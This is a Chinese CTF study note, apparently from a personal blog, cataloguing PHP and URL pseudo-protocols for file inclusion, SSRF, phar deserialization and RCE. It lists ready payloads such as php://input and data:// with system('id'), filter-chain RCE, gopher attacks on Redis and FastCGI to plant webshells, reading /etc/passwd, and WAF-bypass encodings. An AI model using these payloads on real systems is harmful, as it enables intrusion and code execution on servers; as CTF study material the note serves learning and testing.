---
cover: https://picsum.photos/seed/ctf/800/400
title: CTF 伪协议
categories:
  - 笔记
tags:
  - 笔记
  - CTF
  - 文件包含
  - 伪协议
abbrlink: '58685328'
date: 2026-03-19 12:00:00# CTF 伪协议

## 一、常见伪协议

| 协议 | 用途 | 示例 |
|------|------|------|
| `file://` | 读取本地文件 | `file:///etc/passwd` |
| `php://filter` | 读取PHP文件源码（绕过include执行） | `php://filter/read=convert.base64-encode/resource=index.php` |
| `php://input` | 读取POST原始数据，配合文件包含执行代码 | `?file=php://input` + POST: `<?php system('id');?>` |
| `data://` | 直接传入数据执行 | `data://text/plain,<?php system('id');?>` |
| `zip://` | 读取zip内文件 | `zip:///tmp/a.zip#shell.php` |
| `phar://` | 读取phar内文件，可触发反序列化 | `phar:///tmp/a.phar/a.txt` |
| `expect://` | 执行系统命令（需扩展） | `expect://id` |
| `dict://` | 探测端口/服务 | `dict://127.0.0.1:6379/info` |
| `gopher://` | 发送任意TCP数据（SSRF神器） | `gopher://127.0.0.1:80/_GET / HTTP/1.1...` |
| `http(s)://` | 标准HTTP请求，常用于SSRF | `http://内网IP/` |
| `ftp://` | FTP协议 | `ftp://user:pass@host/file` |

---

## 二、php://filter 变种（重点）

### 基础读取
```
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
```

### 多重过滤器链（绕过WAF/过滤）
```
php://filter/read=convert.base64-encode|convert.base64-encode/resource=index.php
```

### 写文件（配合文件包含）
```
php://filter/write=convert.base64-decode/resource=shell.php
```

### filter链 RCE（无需写文件，PHP < 8.x）
利用 `iconv` 等 filter 链构造任意字符串，实现 RCE：
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|.../resource=/dev/null
```
> 工具：[php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

---

## 三、data:// 变种

```
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

---

## 四、gopher:// 变种（SSRF）

攻击内网服务，格式：`gopher://host:port/_<URL编码的数据>`

### 常见攻击目标
- **Redis**：写 WebShell、计划任务、SSH key
- **MySQL**：未授权访问执行SQL
- **FastCGI**：RCE（攻击 9000 端口）
- **HTTP内网**：访问内网 API

### 编码要点
- 数据需 URL 编码一次（发出时）
- 经过二次跳转需编码两次（双重URL编码）
- `\r\n` 编码为 `%0d%0a`

---

## 五、phar:// 反序列化

1. 构造含恶意序列化数据的 phar 文件
2. 将其伪装成合法格式（如图片，修改头部）
3. 通过文件操作函数触发：`file_exists()` / `is_file()` / `fopen()` 等
4. 配合上传点使用

```php
// 触发点示例
file_exists("phar:///upload/shell.gif");
```

---

## 六、编码绕过技巧

### Base64
```
php://filter/read=convert.base64-encode/resource=flag.php
```

### URL 编码
```
data:%2f%2ftext/plain,<?php...?>
```

### 二次/多次编码（针对WAF）
```
gopher://127.0.0.1:80/_%2547%2545%2554   # 双重URL编码 GET
```

### 大小写混淆
```
DATA://text/plain,<?php...?>
Php://filter/...
FILE:///etc/passwd
```

### 协议拼接绕过
```
php://filter/resource=php://filter/read=convert.base64-encode/resource=flag.php
```

---

## 七、常见利用场景对应

| 漏洞场景 | 推荐协议 |
|----------|----------|
| 文件包含（LFI） | `php://filter`, `php://input`, `data://`, `phar://`, `zip://` |
| SSRF | `gopher://`, `dict://`, `file://`, `http://` |
| 任意文件读取 | `file://`, `php://filter` |
| RCE | `php://input`, `data://`, `expect://`, filter链 |
| 反序列化触发 | `phar://` |

---

## 八、速查 Tricks

- `allow_url_include=On` → 才能用 `php://input`、`data://`
- `allow_url_fopen=On` → 才能用远程 `http://`、`ftp://`
- `file://` 本地文件无需任何配置
- phar 触发不依赖 `include`，只要有文件操作函数即可
- gopher 的 `_` 后第一个字符会被吞掉，需补一个占位字符
